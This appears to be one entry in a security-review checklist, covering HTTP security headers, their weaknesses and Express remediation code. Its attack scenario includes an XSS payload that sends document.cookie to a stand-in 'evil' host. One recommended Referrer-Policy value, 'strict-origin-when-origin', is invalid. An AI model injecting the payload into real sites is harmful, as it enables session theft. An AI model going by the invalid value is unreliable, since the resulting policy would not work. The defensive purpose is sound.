---
id: P105
name: SecurityHeaders
area: V13 Configuration
refs: ASVS V14.5.x / WSTG-CONF-07 / CS: Content Security Policy, HTTP Headers, Clickjacking Defense
requires: [backend]
---

# P105 — SecurityHeaders

## Overview
HTTP security response headers are browser-enforced controls that constrain how a rendered response may be used — where scripts can load from, whether the page may be framed, what plugins/may be invoked, and how content types are sniffed. They are the last line of defense when an input-encoding or authorization flaw slips through: a strong Content Security Policy (CSP) turns a reflected XSS into a no-op, `X-Frame-Options`/`frame-ancestors` defeats clickjacking, and `X-Content-Type-Options: nosniff` blocks MIME-confusion attacks. The root cause of missing or weak headers is almost always a **framework default left unchanged, a reverse proxy/CDN that strips them, or a permissive CSP widened with `unsafe-inline`/`unsafe-eval`/wildcards** to "make things work." Headers are only effective if served on every HTML response, including error pages and static assets where applicable.

## What to check
- Is a `Content-Security-Policy` header present on **every** HTML response, and is it a real policy (`default-src 'self'`) rather than `default-src *` or absent?
- Does the CSP rely on `'unsafe-inline'` and/or `'unsafe-eval'` in `script-src`/`style-src`? This neutralizes most of CSP's XSS protection. Prefer nonces (`'nonce-<random>'`) or hashes; allow `strict-dynamic` for SRI'd third-party scripts.
- Are `object-src 'none'` and `base-uri 'self'` set (blocks Flash/plugin vectors and `<base>` hijack)? Is `upgrade-insecure-requests` present?
- Is there framing protection? Modern: CSP `frame-ancestors 'none'` / `'self'`. Legacy: `X-Frame-Options: DENY` or `SAMEORIGIN`. Note `X-Frame-Options` is overridden by CSP `frame-ancestors` when both are present.
- Is `X-Content-Type-Options: nosniff` set on all responses (not just HTML) to prevent MIME sniffing and `style`/`script` reinterpretation?
- Is `Referrer-Policy` set to a restrictive value (`strict-origin-when-origin` or `no-referrer`), avoiding leakage of URLs/tokens in the path/query to third parties?
- Is a `Permissions-Policy`/`Feature-Policy` defined that disables unneeded browser features (`camera`, `microphone`, `geolocation`, `payment`, `usb`) for the origin and its iframes?
- Is `Strict-Transport-Security` present with a long `max-age`, `includeSubDomains`, and `preload` (TLS-only)? Missing HSTS allows SSL-stripping and certificate-error bypass on first visit.
- Is `Cross-Origin-Opener-Policy`/`Cross-Origin-Resource-Policy`/`Cross-Origin-Embedder-Policy` configured where isolation of popups, cross-origin loads, or Spectre-class attacks matter?
- Are headers applied uniformly across frameworks, reverse proxies (Nginx/Apache), CDNs (Cloudflare), and load balancers — not just in the app code? A misconfigured proxy often strips them.

## Static signals
Missing middleware / no global header setter:
- Node/Express: no `app.use(helmet())`; no `res.set('Content-Security-Policy', ...)`.
- Django: `SECURE_CONTENT_TYPE_NOSNIFF`, `SECURE_BROWSER_XSS_FILTER`, `SECURE_HSTS_SECONDS`, `CSP_*` (django-csp) absent or set to permissive values.
- Flask: no `flask-talisman`; no `after_request` setting headers.
- Rails: no `config.action_dispatch.default_headers` / no `secure_headers` gem.
- Spring Boot: no `SecurityHeadersConfigurer` / no `X-Frame-Options`/`ContentSecurityPolicy` in `SecurityFilterChain`.
- Go (net/http): raw `w.WriteHeader` / `w.Write` without `w.Header().Set(...)` for CSP/XFO.
- PHP: no `header('Content-Security-Policy: ...')`; Laravel `$middleware` without `security headers`.

Overly permissive CSP:
- `script-src 'unsafe-inline' 'unsafe-eval'`
- `default-src *` / `default-src 'none'` *with* `*` in a specific directive (e.g. `img-src *`)
- `connect-src 'unsafe-inline'` (invalid but signals misunderstanding)
- Wildcard origins: `script-src https:` or `script-src *.cdn.com`
- `style-src 'unsafe-inline'` (common, reduces but does not eliminate value)

Missing/weak framing & transport:
- No `X-Frame-Options` and no CSP `frame-ancestors`
- `X-Frame-Options: ALLOW-FROM` (deprecated, ignored by modern browsers)
- No `Strict-Transport-Security` header, or `max-age` below ~31536000

Reverse-proxy / server configs:
- Nginx: `server { }` block with no `add_header Content-Security-Policy ...;` (note: `add_header` at `server` level is overridden by `add_header` in `location` — headers silently dropped).
- Apache: `.htaccess` / `<VirtualHost>` lacking `Header always set ...`.

## False positives
- The endpoint is a JSON/XML **API** returning no HTML (`Content-Type: application/json`): CSP/XFO are largely irrelevant; `nosniff`, `HSTS`, `Referrer-Policy`, and `CORP/CORS` still apply.
- A restrictive CSP uses `'unsafe-inline'` for `style-src` only, with nonces/hashes for `script-src` — XSS protection for scripts is intact (CSS-based exfiltration risk remains but is bounded).
- `frame-ancestors` is intentionally `'self'` because the page is a legitimate embeddable widget; verify the embedding origin list is minimal and trusted.
- A single-page app deliberately uses `'unsafe-eval'` for a trusted in-house framework (rare) — still flag it; confirm with the team and consider `strict-dynamic` instead.
- HSTS is omitted because the app is intentionally HTTP-only on an isolated internal network — confirm there is genuinely no TLS exposure.

## Attack scenario
1. The app ships no CSP and no `X-Frame-Options`. A reflected XSS (P38) or stored XSS exists in a profile field.
2. Attacker injects `<script>fetch('//evil/?c='+document.cookie)</script>`; with no CSP it executes freely, stealing the session cookie.
3. Separately, the attacker hosts a page that iframes the target's "Delete Account" button, transparently overlays it, and tricks the user into clicking — classic clickjacking, possible only because framing is unrestricted.
4. On a separate app with weak `Referrer-Policy` (default `no-referrer-when-downgrade`), a user follows an external link and the full URL — including a password-reset token in the query string — leaks to the third-party server via the `Referer` header.
5. Missing `X-Content-Type-Options: nosniff` lets an attacker upload a file the server serves as `text/plain` but the browser sniffs as HTML/JS, executing attacker content in the origin.

## Impact
- **Confidentiality**: absent CSP amplifies XSS into cookie/token theft; permissive `Referrer-Policy` leaks sensitive URLs and tokens to third parties.
- **Integrity**: clickjacking (no `frame-ancestors`) induces authenticated actions; MIME sniffing (no `nosniff`) executes attacker-controlled content in the origin.
- **Availability**: framing/MITM-based disruption; plugin abuse via unguarded `Permissions-Policy`.
- Severity scales with the underlying flaw headers would have contained: with strong CSP, an XSS is often downgraded to informational; without it, the same XSS is Critical (account takeover). HSTS absence converts a one-time network-position attack into persistent compromise.

## Remediation
Apply headers globally via framework middleware, not per-handler; deploy a nonce/hash-based CSP rather than `unsafe-*`:
```ts
// VULNERABLE — no headers; XSS & clickjacking fully exposed
app.get('/', (req, res) => res.render('home'));

// SAFE — helmet with a strict, nonce-based CSP + framing protection
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomUUID();
  res.setHeader('Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${res.locals.cspNonce}'; ` +
    `object-src 'none'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests`);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  next();
});
// render templates referencing the nonce: <script nonce="<%= cspNonce %>">
```
Configure the same headers at the reverse proxy/CDN layer (Nginx `add_header`, Cloudflare transform rules) and **verify with an external scanner** (`curl -I`, browser DevTools, securityheaders.com) on every response path, including error pages — defense-in-depth requires the header actually reach the browser, not just be set in code.

## References
- ASVS V14.5.x
- WSTG-CONF-07
- CS: Content Security Policy, HTTP Headers, Clickjacking Defense
